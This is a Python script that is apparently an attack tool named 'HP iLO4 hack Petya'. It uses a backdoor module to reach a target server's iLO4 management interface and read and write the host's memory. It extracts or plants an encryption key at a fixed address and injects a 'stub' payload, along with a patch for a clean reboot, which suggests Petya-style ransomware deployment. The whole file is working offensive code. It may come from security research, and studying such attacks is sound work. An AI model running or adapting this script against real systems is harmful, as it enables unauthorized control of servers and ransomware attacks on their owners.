import sys
import requests
from mod_backdoor import *
import argparse

parser = argparse.ArgumentParser(description="HP iLO4 hack Petya")
parser.add_argument('remote_addr', help="IP address of the target iLO4 interface")
parser.add_argument('-k', '--key', help="key")
parser.add_argument('-v', '--verbose', action='store_true', help="verbosity")

args = parser.parse_args()

mod = ModBackdoor(args)

def read_mem(addr, size):
    global mod
    return mod.dump_memory(addr, size)

def write_mem(addr, data):
    global mod
    return mod.write_memory(addr, data)

stub = open("stub","r").read()
if args.key is None:
    key = read_mem(0x674A, 32)
    print("Key found in memory: " + key.encode("hex"))
else:
    key = args.key.decode("hex")
    write_mem(0x674A, key)
while True:
    ans = raw_input("Do you want to patch the memory? [Y/n] ")
    if ans == "n":
        print("Abort!")
        sys.exit(2)
    if ans == "Y":
        break
write_mem(0x82A8, stub)
write_mem(0x829f, "cd19".decode("hex")) # Patch for a clean reboot
print("Memory has been patched!")

